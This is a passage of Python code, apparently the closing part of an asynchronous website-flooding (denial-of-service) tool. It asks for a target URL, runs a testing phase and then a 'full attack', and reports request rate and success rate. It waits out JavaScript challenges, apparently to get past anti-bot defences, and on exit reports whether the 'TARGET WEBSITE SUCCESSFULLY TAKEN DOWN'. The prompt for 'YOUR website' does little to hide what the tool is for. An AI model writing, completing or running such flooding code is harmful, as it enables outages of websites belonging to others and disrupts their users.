        last_time = time.time()

        while _running:
            await asyncio.sleep(1)

            if _attack_paused:
                sys.stdout.write(f"\r{Colors.YELLOW}[ATTACK PAUSED]{Colors.RESET} Waiting for JS challenge resolution...                  ")
                sys.stdout.flush()
                continue

            current_time = time.time()
            elapsed = current_time - last_time
            async with counter_lock:
                current_count = _request_count

            if elapsed > 0:
                current_rps = (current_count - last_count) / elapsed
                last_count = current_count
                last_time = current_time

                if _attack_active:
                    async with counter_lock:
                        success_rate = (_success_count / _request_count) * 100 if _request_count > 0 else 0

                    sys.stdout.write(f"\rTasks: {len([task for task in self.attack_tasks if not task.done()])} | Rate: {current_rps:.1f} req/s | Total: {_request_count} | Success: {success_rate:.1f}%")
                    sys.stdout.flush()

# Main execution function
async def main():
    global start_time, _running, _request_count, _success_count, _target_down

    print_banner()

    target_url = input("Enter YOUR website URL to test and attack: ")
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url

    coordinator = AsyncAttackCoordinator(target_url)

    reachable, _ = await coordinator.verify_target_async()
    if not reachable:
        print("Target is not reachable. Exiting.")
        sys.exit(1)

    start_time = time.time()

    # Start stats monitor and continuation checker as asyncio tasks
    asyncio.create_task(coordinator.stats_monitor_async())
    asyncio.create_task(coordinator.check_for_continuation_async())

    if await coordinator.run_testing_phase_async():
        await coordinator.launch_full_attack_async()

    while _running:
        await asyncio.sleep(0.1)

# Entry point
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Test interrupted by user. Shutting down...{Colors.RESET}")
        _running = False
        # Give some time for pending tasks to clean up or for coordinator to close session
        time.sleep(2) # Short sleep to allow cleanup
        if _request_count > 0:
            print(f"\n{Colors.CYAN}===== FINAL RESULTS ====={Colors.RESET}")
            print(f"Total requests sent: {_request_count}")
            print(f"Success rate: {(_success_count / _request_count) * 100:.1f}%")
            if _target_down:
                print(f"\n{Colors.GREEN}TARGET WEBSITE SUCCESSFULLY TAKEN DOWN{Colors.RESET}")
            else:
                print(f"\n{Colors.RED}Attack stopped before target was taken down{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}An error occurred: {str(e)}{Colors.RESET}")
    finally:
        print(f"\n{Colors.MAGENTA}Test complete. Exiting.{Colors.RESET}")
        # Force exit to terminate all asyncio tasks and threads
        os._exit(0)
